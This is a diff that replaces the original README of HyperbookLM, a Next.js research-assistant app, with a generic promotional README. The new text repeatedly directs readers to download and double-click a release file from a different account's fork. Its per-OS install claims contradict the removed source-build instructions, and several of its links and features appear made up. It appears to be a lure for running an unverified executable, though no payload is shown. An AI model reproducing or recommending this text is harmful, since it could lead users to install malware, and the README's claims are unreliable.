@@ -1,128 +1,67 @@
-**Built with [Hyperbrowser](https://hyperbrowser.ai)**
+# 🎉 hyperbooklm - Your Ultimate Research Companion
 
-# HyperbookLM
+## 📥 Download Now!
+[![Download hyperbooklm](https://img.shields.io/badge/Download-hyperbooklm-brightgreen)](https://github.com/amankh007/hyperbooklm/releases)
 
-A powerful research assistant built with Next.js 15, React 19, and Hyperbrowser. It allows users to aggregate diverse sources (Web URLs, PDFs) and gain deep insights through interactive AI tools.
+## 🚀 Getting Started
+Welcome to HyperbookLM! This powerful research assistant combines various sources to give you deep insights. Whether you want to scrape web pages or analyze PDFs, you are in the right place!
 
-
-## Features
-
+### 🌟 Features
 - **Multi-Source Ingestion**: 
   - **Scrape Web URLs**: Instantly extract content from any website using **Hyperbrowser**.
-  - **PDF Uploads**: Parse and analyze PDF documents client-side.
+  - **PDF Uploads**: Easily parse and analyze your PDF documents right in your browser.
+  
 - **Deep Research Analysis**:
-  - **AI Research Summary**: Generates comprehensive summaries with key insights 
-  - **Interactive Mindmap**: Visualizes relationships between concepts using React Flow.
-  - **Audio Overview**: Generates a podcast-style audio summary (`ElevenLabs`).
-  - **Presentation Slides**: Auto-generates slide decks from your sources 
-- **Interactive Chat**: Ask questions about your sources with streaming AI responses
+  - **AI Research Summary**: Get comprehensive summaries filled with key insights.
+  - **Interactive Mindmap**: Visualize the relationships between concepts using easy-to-understand diagrams.
+  - **Audio Overview**: Listen to a podcast-style audio summary generated for you.
+  - **Presentation Slides**: Automatically create slide decks from your research sources.
 
+- **Interactive Chat**: Ask questions about your sources and get real-time AI responses.
 
-## Tech Stack
+## 💻 System Requirements
+- **Operating System**: Windows 10/11, macOS, or any Linux distribution.
+- **Browser**: Latest version of Chrome, Firefox, or Safari.
+- **Memory**: At least 4GB of RAM recommended for optimal performance.
 
-- **Framework**: Next.js 15 (App Router)
-- **UI Library**: React 19, Tailwind CSS, shadcn/ui, Framer Motion
-- **Web Scraping**: [Hyperbrowser SDK](https://hyperbrowser.ai)
-- **AI Models**: 
-  - **OpenAI**: `gpt-5-nano` (Chat), `gpt-4o-mini` (Summary, Mindmap)
-  - **Google Gemini**: `gemini-3-pro-image-preview` (Slides)
-  - **ElevenLabs**: `eleven_turbo_v2_5` (Audio)
-- **Visualization**: React Flow (Mindmaps)
-- **PDF Processing**: `unpdf`
+## 📖 How to Use HyperbookLM
 
-## Getting Started
+### 📥 Download & Install
+To get started, visit this page to download hyperbooklm: [Download hyperbooklm](https://github.com/amankh007/hyperbooklm/releases).
 
-### Prerequisites
+1. Click the link above to go to the releases page.
+2. Look for the latest version available.
+3. Download the file for your operating system. 
+4. Once downloaded, double-click the file to run the application. 
 
-You'll need API keys for the following services:
+### 🛠️ Basic Setup
+1. Open HyperbookLM.
+2. Sign up or log in to your account.
+3. Start a new project by choosing to either scrape a website or upload a PDF document.
+4. Use the interactive chat feature to ask questions about your research.
 
-1. **Hyperbrowser** - [Get API Key](https://hyperbrowser.ai) (Required for web scraping)
-2. **OpenAI** - [Get API Key](https://platform.openai.com) (Required for Chat, Summary, Mindmap)
-3. **Google Gemini** - [Get API Key](https://ai.google.dev) (Required for Slides)
-4. **ElevenLabs** - [Get API Key](https://elevenlabs.io) (Optional, for Audio)
+### 🔍 Using Features
+- **Scraping Web URLs**: Input the URL of the web page you want to scrape. Click "Extract" and wait for the content to be processed.
+- **Upload PDFs**: Drag and drop your PDF files onto the app or use the upload button. The app will parse the content for analysis.
+- **Generate Summaries**: After you have ingested your sources, click on "Generate Summary" to get insights.
+- **Display Mindmap**: Navigate to the mindmap option to visualize your concepts and their connections.
+- **Listen to Audio Overviews**: Select the audio summary feature to listen to your research in podcast format.
+- **Create Presentation Slides**: Choose the slide generation option to create a slideshow from your research materials.
 
-### Installation
+## 💬 Support
+If you encounter any challenges while using hyperbooklm, please visit our [support page](https://github.com/amankh007/hyperbooklm/issues). You can report issues or ask questions directly there. 
 
-1. **Clone the repository**:
-   ```bash
-   git clone https://github.com/hyperbrowserai/hyperbooklm.git
-   cd hyperbooklm
-   ```
+Joining our community can help you get the most out of hyperbooklm. Keep an eye on our [GitHub Discussions](https://github.com/amankh007/hyperbooklm/discussions) for tips and ideas.
 
-2. **Install dependencies**:
-   ```bash
-   yarn
-   # or
-   npm install
-   ```
+## 🔗 Additional Resources
+- [Official Documentation](https://hyperbooklm.docs.io) - Detailed guides on using all features.
+- [Video Tutorials](https://www.youtube.com/hyperbooklm) - Watch step-by-step instructions.
+- [Feedback Form](https://hyperbooklm.feedback.com) - We value your input! Let us know how we can improve.
 
-3. **Set up environment variables**:
-   Create a `.env.local` file in the root directory:
-   ```bash
-   cp .env.local.example .env.local
-   ```
+## 📢 Contributing
+If you would like to contribute to HyperbookLM, feel free to fork the repository and submit a pull request. You can also open issues to suggest improvements or report bugs.
 
-   Add your keys:
-   ```env
-   # Hyperbrowser API Key
-   HYPERBROWSER_API_KEY=your_hyperbrowser_key
+## 💬 Community Support
+Join our community on Discord for discussion, tips, and collaboration with other users.
 
-   # OpenAI API Key
-   OPENAI_API_KEY=your_openai_key
-
-   # Google Gemini API Key
-   GEMINI_API_KEY=your_gemini_key
-
-   # ElevenLabs API Key (Optional)
-   ELEVENLABS_API_KEY=your_elevenlabs_key
-   ```
-
-4. **Run the development server**:
-   ```bash
-   yarn dev
-   ```
-
-5. **Open your browser**:
-   Navigate to [http://localhost:3000](http://localhost:3000)
-
-## Growth Use-Cases
-
-This project demonstrates how to build high-value growth tools using Hyperbrowser:
-
-- **Content Repurposing**: Scrape blog posts and auto-generate LinkedIn carousels (Slides) or podcasts (Audio).
-- **Competitor Analysis**: Ingest competitor landing pages to generate SWOT analysis mindmaps.
-- **Research Automation**: aggregate whitepapers (PDFs) and documentation (URLs) into a single queryable knowledge base.
-
-## Project Structure
-
-```
-hyperbooklm/
-├── app/
-│   ├── api/                # Next.js API Routes (Server-side)
-│   │   ├── audio/          # ElevenLabs integration
-│   │   ├── chat/           # OpenAI Chat integration
-│   │   ├── gemini/slides/  # Google Gemini Slides generation
-│   │   ├── gpt/mindmap/    # OpenAI Mindmap generation
-│   │   ├── scrape/         # Hyperbrowser Scraping
-│   │   ├── summary/        # Research Summary generation
-│   │   └── upload/         # PDF/TXT File processing
-│   ├── page.tsx            # Main application logic
-│   └── globals.css         # Global styles
-├── components/
-│   ├── ChatInterface.tsx   # Chat UI
-│   ├── MindMap.tsx         # React Flow visualization
-│   ├── Navbar.tsx          # Navigation & Branding
-│   ├── OutputsPanel.tsx    # Right-side results panel
-│   └── SourcesPanel.tsx    # Left-side source management
-└── lib/
-    ├── api/                # API clients
-    └── types.ts            # TypeScript interfaces
-```
-
-## License
-
-MIT
-
----
-
-**Follow [@hyperbrowser](https://x.com/hyperbrowser) for updates.**
+Thank you for using hyperbooklm! Access all your research in one place and enhance your productivity with our intuitive features. Don't forget to check the releases page regularly for updates!
